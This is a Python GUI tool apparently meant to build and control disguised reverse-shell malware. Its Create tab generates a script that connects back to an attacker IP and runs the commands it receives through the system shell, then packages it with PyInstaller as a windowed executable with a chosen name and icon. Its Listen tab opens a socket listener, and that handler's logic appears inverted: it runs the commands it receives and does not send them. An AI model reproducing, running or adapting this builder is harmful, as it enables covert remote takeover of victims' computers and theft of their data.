import customtkinter as ctk
import socket
import subprocess
import os
import time
import tkinter as tk
from tkinter import filedialog
import threading

# Initialize current_directory to the current working directory
current_directory = os.getcwd()
new_dir = ""
e = ""
server_socket = None
client_socket = None

# Function to create app
def create_app():
    # Get input data from the user
    app_name = app_name_entry.get()
    app_icon = app_icon_entry.get()
    host = host_entry.get()
    port = port_entry.get()
    output_folder = folder_path_entry.get()

    if not app_name or not app_icon or not host or not port or not output_folder:
        print("All fields must be filled.")
        return

    # Path for saving the Python file
    python_file_path = os.path.join(output_folder, f"{app_name}.py")

    # Generate the python file content
    python_code = f"""
import socket
import subprocess
import os
import time

# Set up the IP and port of the attacker's machine (your Android device)
attacker_ip = '{host}'  # Replace with your Android device's IP
attacker_port = {port}  # The port you are listening on in Termux

def connect_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((attacker_ip, attacker_port))
        print("Connection established.")
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

# Start in the user's home directory
current_directory = os.getcwd()

while True:
    sock = connect_shell()
    if sock:
        while True:
            try:
                # Receive command from the attacker
                command = sock.recv(1024).decode("utf-8")

                if not command:
                    # If no command is received, reconnect
                    print("Connection lost. Reconnecting...")
                    sock.close()
                    break

                if command.lower() == "exit":
                    sock.close()
                    print("Exiting shell.")
                    break

                # Change the current directory if the command is 'cd'
                if command.startswith("cd "):
                    try:
                        new_dir = command[3:].strip()
                        os.chdir(new_dir)
                        current_directory = os.getcwd()
                        sock.send(f"Changed directory to {current_directory}\\n".encode("utf-8"))
                    except FileNotFoundError:
                        sock.send(f"Directory not found: {new_dir}\\n".encode("utf-8"))
                else:
                    # Execute other commands in the current directory
                    output = subprocess.run(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        cwd=current_directory,
                    )
                    sock.send(output.stdout + output.stderr)

            except Exception as e:
                sock.send(f"Error: {str(e)}\\n".encode("utf-8"))
                break
    else:
        # If connection fails, retry after 10 seconds
        print("Retrying connection...")
        time.sleep(10)
    """

    # Write the generated code to a Python file
    with open(python_file_path, 'w') as file:
        file.write(python_code)

    print(f"Python file created at {python_file_path}")

    # Change directory to the output folder before running PyInstaller
    os.chdir(output_folder)

    # Use PyInstaller to generate an exe
    pyinstaller_command = f"python -m PyInstaller --noconfirm --onefile --windowed --icon \"{app_icon}\" \"{python_file_path}\""
    os.system(pyinstaller_command)
    print("Executable created successfully!")

# Function to select folder using file dialog
def select_folder():
    folder_path = filedialog.askdirectory()
    if folder_path:
        folder_path_entry.delete(0, tk.END)
        folder_path_entry.insert(0, folder_path)

# Function to browse and select icon file
def browse_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    if icon_path:
        app_icon_entry.delete(0, tk.END)
        app_icon_entry.insert(0, icon_path)

# Function to start the socket listener
def start_listener():
    global server_socket
    port = listen_port_entry.get()
    if not port:
        print("Port is required to start listening.")
        return

    print(f"Listening on port {port}...")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', int(port)))
    server_socket.listen(5)
    print("Server is waiting for a connection...")

    while True:
        try:
            global client_socket
            client_socket, client_address = server_socket.accept()
            print(f"Connection established with {client_address}")
            handle_client(client_socket)
        except KeyboardInterrupt:
            stop_listener()
            break
        except Exception as e:
            print(f"Error: {e}")
            break

def start_listener_thread():
    threading.Thread(target=start_listener, daemon=True).start()

# Function to handle communication with a client
def handle_client(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                client_socket.close()
                break

            # Execute the command and send the output back to the client
            output = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            client_socket.send(output.stdout + output.stderr)

    except Exception as e:
        client_socket.send(f"Error: {str(e)}".encode("utf-8"))
        client_socket.close()

# Function to stop the listener
def stop_listener():
    global server_socket
    global client_socket

    if server_socket:
        server_socket.close()
        print("Server socket closed.")
    if client_socket:
        client_socket.close()
        print("Client socket closed.")

# Setting up the GUI
root = ctk.CTk()

root.geometry("500x600")
root.title("App Creator & Listener")

tabview = ctk.CTkTabview(root)
tabview.grid(row=0, column=0, padx=10, pady=10)

# Create tab
create_tab = tabview.add("Create")
listen_tab = tabview.add("Listen")

# Create tab content
app_name_label = ctk.CTkLabel(create_tab, text="App Name:")
app_name_label.grid(row=0, column=0, padx=10, pady=10)
app_name_entry = ctk.CTkEntry(create_tab)
app_name_entry.grid(row=0, column=1, padx=10, pady=10)

app_icon_label = ctk.CTkLabel(create_tab, text="App Icon (.ico):")
app_icon_label.grid(row=1, column=0, padx=10, pady=10)
app_icon_entry = ctk.CTkEntry(create_tab)
app_icon_entry.grid(row=1, column=1, padx=10, pady=10)

browse_button = ctk.CTkButton(create_tab, text="Browse", command=browse_icon)
browse_button.grid(row=1, column=2, padx=10, pady=10)

host_label = ctk.CTkLabel(create_tab, text="Host (IP):")
host_label.grid(row=2, column=0, padx=10, pady=10)
host_entry = ctk.CTkEntry(create_tab)
host_entry.grid(row=2, column=1, padx=10, pady=10)

port_label = ctk.CTkLabel(create_tab, text="Port:")
port_label.grid(row=3, column=0, padx=10, pady=10)
port_entry = ctk.CTkEntry(create_tab)
port_entry.grid(row=3, column=1, padx=10, pady=10)

folder_label = ctk.CTkLabel(create_tab, text="Output Folder:")
folder_label.grid(row=4, column=0, padx=10, pady=10)
folder_path_entry = ctk.CTkEntry(create_tab)
folder_path_entry.grid(row=4, column=1, padx=10, pady=10)

folder_button = ctk.CTkButton(create_tab, text="Select Folder", command=select_folder)
folder_button.grid(row=4, column=2, padx=10, pady=10)

create_button = ctk.CTkButton(create_tab, text="Create", command=create_app)
create_button.grid(row=5, column=0, columnspan=3, pady=10)

# Listen tab content
listen_port_label = ctk.CTkLabel(listen_tab, text="Port to Listen:")
listen_port_label.grid(row=0, column=0, padx=10, pady=10)
listen_port_entry = ctk.CTkEntry(listen_tab)
listen_port_entry.grid(row=0, column=1, padx=10, pady=10)

listen_button = ctk.CTkButton(listen_tab, text="Start Listening", command=start_listener_thread)
listen_button.grid(row=1, column=0, padx=10, pady=10)

stop_button = ctk.CTkButton(listen_tab, text="Stop Listening", command=stop_listener)
stop_button.grid(row=1, column=1, padx=10, pady=10)

root.mainloop()
